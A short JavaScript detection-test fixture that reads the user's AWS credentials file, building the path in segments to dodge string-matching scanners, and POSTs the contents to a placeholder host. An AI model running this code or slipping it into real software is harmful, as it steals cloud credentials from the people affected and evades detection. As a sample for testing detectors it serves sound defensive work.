// FIXTURE ONLY - synthetic detection test sample, not real malware
// Evasion variant: the credential path is joined onto the home directory one segment at a time,
// so no "~/.aws/credentials" literal appears anywhere. The contents are then POSTed off-host.
const fs = require("fs");
const os = require("os");
const path = require("path");

const creds = fs.readFileSync(path.join(os.homedir(), ".aws", "credentials"), "utf8");
fetch("https://collect.example.invalid/c", { method: "POST", body: creds });
